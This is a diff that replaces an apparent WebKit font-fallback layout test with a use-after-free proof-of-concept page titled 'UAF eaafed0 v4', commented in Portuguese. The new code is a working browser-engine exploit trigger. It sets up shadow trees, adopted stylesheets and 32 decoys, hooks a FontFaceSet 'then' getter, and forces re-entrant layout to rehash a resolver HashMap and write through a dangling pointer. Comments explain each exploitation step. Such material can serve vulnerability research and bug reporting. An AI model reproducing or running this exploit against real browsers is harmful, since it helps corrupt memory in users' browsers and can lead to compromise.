@@ -1,48 +1,235 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>UAF eaafed0 v4</title>
+<style>
+body{background:#111;color:#ccc;font-family:monospace;font-size:13px;padding:8px;margin:0}
+h2{color:#8cf;font-size:14px;margin:0 0 6px}
+.r{padding:2px 4px;border-bottom:1px solid #1a1a1a}
+.ok{color:#4e4} .no{color:#e44} .wn{color:#ea4} .in{color:#48e}
+#out{background:#0a0a0a;border:1px solid #333;padding:6px;min-height:50px}
+</style>
+</head>
 <body>
+<h2>UAF eaafed0 v4</h2>
+<div id="out"><div class="r in">Script carregado</div></div>
+
 <script>
-function finish(message)
-{
-    document.body.appendChild(document.createTextNode(message));
+window.onerror = function(msg, src, line) {
+    addRow('ERRO JS linha ' + line + ': ' + msg, 'no');
+    return true;
+};
+
+var FONT_FAMILY = 'SF' + Math.floor(Math.random() * 99999);
+var FONT_URL    = 'nofont' + Date.now() + '.woff';
+var DECOY_COUNT = 32;
+
+function addRow(text, cls) {
+    var d = document.createElement('div');
+    d.className = 'r ' + (cls || 'in');
+    d.textContent = text;
+    document.getElementById('out').appendChild(d);
 }
 
-const faceCount = 4;
+function setup() {
+    addRow('--- Setup ---');
+    void document.fonts;
 
-const worker = new Worker('resources/fallback-walk-prune-worker.js');
-worker.onmessage = async function (event)
-{
-    const dataURL = event.data;
+    // Stylesheet com @font-face (qualquer URL — ficara "loading" sincronamente)
+    var fontSheet = new CSSStyleSheet();
+    fontSheet.replaceSync('@font-face { font-family: ' + FONT_FAMILY +
+                          '; src: url("' + FONT_URL + '"); }');
 
-    const faces = [];
-    for (let faceIndex = 0; faceIndex < faceCount; ++faceIndex) {
-        const face = new FontFace('paddedAhem', 'url("' + dataURL + '#' + faceIndex + '")');
-        faces.push(face);
-        document.fonts.add(face);
+    var extraSheet = new CSSStyleSheet();
+    extraSheet.replaceSync('.mk { color: green; }');
+
+    var decoySheets = [];
+    for (var i = 0; i < DECOY_COUNT; i++) {
+        var ds = new CSSStyleSheet();
+        ds.replaceSync('.d' + i + ' { color: rgb(' + i + ',1,2); }');
+        decoySheets.push(ds);
     }
 
-    // Bring the prune counter to one below its interval so that a pump during the walk crosses it.
-    const primingContext = document.createElement('canvas').getContext('2d');
-    for (let primeIndex = 0; primeIndex < 1000 - faceCount; ++primeIndex)
-        primingContext.font = '11px primingFamily' + primeIndex;
+    // Shadow tree A — adota [fontSheet]
+    var hostA = document.createElement('div');
+    document.body.appendChild(hostA);
+    var rootA = hostA.attachShadow({ mode: 'open' });
+    rootA.adoptedStyleSheets = [fontSheet];
+    var spanA = document.createElement('span');
+    spanA.style.fontFamily = FONT_FAMILY;
+    spanA.textContent = 'A';
+    rootA.appendChild(spanA);
 
-    // Times has no glyph for U+13A0, so resolving it walks down to paddedAhem.
-    const canvas = document.createElement('canvas');
-    canvas.width = 400;
-    canvas.height = 400;
-    const context = canvas.getContext('2d');
-    context.font = '32px Times, paddedAhem';
-    context.fillText(String.fromCharCode(0x13A0) + String.fromCharCode(0x0301), 40, 200);
+    // Shadow tree B — adota [fontSheet, extraSheet] + tem <style> interno
+    var hostB = document.createElement('div');
+    document.body.appendChild(hostB);
+    var rootB = hostB.attachShadow({ mode: 'open' });
+    var gadgetStyle = document.createElement('style');
+    gadgetStyle.textContent = '.gadget { color: navy; }';
+    rootB.appendChild(gadgetStyle);
+    var wrapperB = document.createElement('div');
+    var elementB = document.createElement('span');
+    wrapperB.appendChild(elementB);
+    rootB.appendChild(wrapperB);
+    rootB.adoptedStyleSheets = [fontSheet, extraSheet];
 
-    // face.loaded is the FontFace's internal promise — resolves when the font
-    // finishes loading through any path (including the C++ fallback walk above),
-    // without issuing a new network request like face.load() would.
-    // allSettled because not all faces may be triggered by fillText.
-    await Promise.allSettled(faces.map(face => face.loaded));
+    // 32 decoys — cada um com <style> interno unico
+    var decoyRoots = [];
+    var decoyStyles = [];
+    for (var j = 0; j < DECOY_COUNT; j++) {
+        var dh = document.createElement('div');
+        document.body.appendChild(dh);
+        var dr = dh.attachShadow({ mode: 'open' });
+        var dsEl = document.createElement('style');
+        dsEl.textContent = '.dg' + j + ' { }';
+        dr.appendChild(dsEl);
+        dr.appendChild(document.createElement('div'));
+        decoyRoots.push(dr);
+        decoyStyles.push(dsEl);
+    }
 
-    finish("PASS if no crash, faces " + faces.map(face => face.status).join(','));
-};
-worker.onerror = function (event) { finish("FAIL: worker error: " + event.message); };
+    // Constroi TODOS os resolvers agora (popula m_sharedShadowTreeResolvers)
+    // Chave de A: [fontSheet]
+    // Chave de B: [fontSheet, extraSheet] + gadgetStyle  → entrada no HashMap
+    // Chaves dos decoys: cada um com seu <style> unico
+    void document.body.offsetHeight;
+    addRow('offsetHeight #1: resolvers construidos. HashMap populado.', 'ok');
+
+    // Materializa document.fonts.ready
+    void document.fonts.ready;
+
+    // Inicia carregamento — STATUS FICA "loading" SINCRONAMENTE
+    document.fonts.load('24px ' + FONT_FAMILY, 'A');
+    addRow('fonts.status = ' + document.fonts.status, 'ok');
+
+    return {
+        fontSheet:    fontSheet,
+        extraSheet:   extraSheet,
+        decoySheets:  decoySheets,
+        hostB:        hostB,
+        rootB:        rootB,
+        gadgetStyle:  gadgetStyle,
+        elementB:     elementB,
+        decoyRoots:   decoyRoots,
+        decoyStyles:  decoyStyles
+    };
+}
+
+function trigger(s) {
+    addRow('--- Trigger ---');
+
+    var getterCount = 0;
+    var orig = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
+
+    Object.defineProperty(FontFaceSet.prototype, 'then', {
+        configurable: true,
+        get: function() {
+            getterCount++;
+            addRow('>>> GETTER DISPAROU count=' + getterCount +
+                   ' status=' + document.fonts.status, 'wn');
+            // Restaura para evitar loop infinito
+            if (orig) {
+                Object.defineProperty(FontFaceSet.prototype, 'then', orig);
+            } else {
+                try { delete FontFaceSet.prototype.then; } catch(e) {}
+            }
+            // REENTRANCIA: reconstroi os 32 decoy resolvers
+            // Cada decoy precisa de nova entrada em m_sharedShadowTreeResolvers
+            // 32 novas entradas → HashMap passa do load factor (75%) → REHASH
+            // → old backing store liberado → ponteiro pinned do ensure() DANGLING
+            // → ensure() escreve de volta → UAF → CRASH
+            addRow('  getter: chamando offsetHeight para rehash...', 'wn');
+            void document.body.offsetHeight;
+            addRow('  apos offsetHeight reentrante', 'wn');
+            return undefined;
+        }
+    });
+    addRow('Getter instalado. status=' + document.fonts.status, 'ok');
+
+    // ----------------------------------------------------------------
+    // PASSO CHAVE: Evictar a entrada de B do m_sharedShadowTreeResolvers
+    // ----------------------------------------------------------------
+    // Mudar temporariamente os adopted stylesheets de B para algo unico
+    // → WebKit descarta a entrada existente de B no HashMap (reference count cai a 0)
+    // → Chave [fontSheet, extraSheet + gadgetStyle] e removida
+    var tempSheet = new CSSStyleSheet();
+    tempSheet.replaceSync('.tmp_evict_' + Date.now() + ' {}');
+    s.rootB.adoptedStyleSheets = [tempSheet];
+
+    // Forca resolucao para confirmar a evicao e construir resolver temporario
+    // (HashMap ganha entrada para [tempSheet], perde entrada para [fontSheet, extraSheet])
+    void s.hostB.offsetHeight;
+    addRow('Evicao: rootB.adoptedStyleSheets=[tempSheet] + offsetHeight #2', 'ok');
+
+    // Invalida os 32 decoys (muda suas chaves)
+    for (var i = 0; i < s.decoyRoots.length; i++) {
+        s.decoyRoots[i].adoptedStyleSheets = [s.decoySheets[i]];
+        s.decoyStyles[i].remove();
+    }
+    s.gadgetStyle.remove();
+
+    void document.styleSheets.length;
+    addRow('Decoys e gadgetStyle invalidados + flush', 'ok');
+
+    // ----------------------------------------------------------------
+    // TRIGGER FINAL: Restaura B para [fontSheet, extraSheet]
+    // ----------------------------------------------------------------
+    // A chave [fontSheet, extraSheet] NAO esta mais no HashMap (foi evictada acima)
+    // → createOrFindSharedShadowTreeResolver() chama ensure(key, functor)
+    // → functor NAO encontra a chave → chama appendAuthorStyleSheets()
+    // → @font-face de fontSheet processada NOVAMENTE (ja foi processada em A)
+    // → re-registro detectado → old CSSFontFace descartada → active count 1→0
+    // → document.fonts.ready se resolve → Promise.resolve(document.fonts)
+    // → [[Get]] FontFaceSet.prototype.then → GETTER DISPARA
+    // → offsetHeight → 32 decoys rebuilt → HashMap rehash → UAF → CRASH
+    s.rootB.adoptedStyleSheets = [s.fontSheet, s.extraSheet];
+    addRow('Restaurando rootB.adoptedStyleSheets=[fontSheet,extraSheet]...', 'wn');
+
+    // Forca layout sincrono → triggera rebuild do resolver de B
+    void s.hostB.offsetHeight;
+    addRow('offsetHeight #3 disparado', 'wn');
+
+    addRow('Chegou apos trigger. Getter count=' + getterCount,
+           getterCount > 0 ? 'ok' : 'wn');
+
+    if (getterCount === 0) {
+        addRow('Getter ainda nao disparou — tentando offsetHeight global...', 'wn');
+        void document.body.offsetHeight;
+        addRow('Getter count apos offsetHeight global=' + getterCount,
+               getterCount > 0 ? 'ok' : 'wn');
+    }
+
+    setTimeout(function() {
+        addRow('500ms: getter=' + getterCount +
+               ' status=' + document.fonts.status, 'in');
+        addRow(getterCount > 0
+            ? 'Getter disparou — se chegou aqui: async (sem crash nesta sessao)'
+            : 'Getter NAO disparou — revisar evicao do HashMap', 'wn');
+        addRow('PASS — chegou sem crash', 'ok');
+    }, 500);
+}
+
+window.addEventListener('load', function() {
+    try {
+        if (typeof FontFaceSet === 'undefined' ||
+            typeof CSSStyleSheet === 'undefined') {
+            addRow('APIs ausentes', 'no'); return;
+        }
+        addRow('APIs OK', 'ok');
+        setTimeout(function() {
+            try {
+                var state = setup();
+                trigger(state);  // sincrono — fonte ainda em "loading"
+            } catch(e) {
+                addRow('ERRO: ' + e, 'no');
+            }
+        }, 0);
+    } catch(e) {
+        addRow('ERRO load: ' + e, 'no');
+    }
+});
 </script>
 </body>
 </html>
+
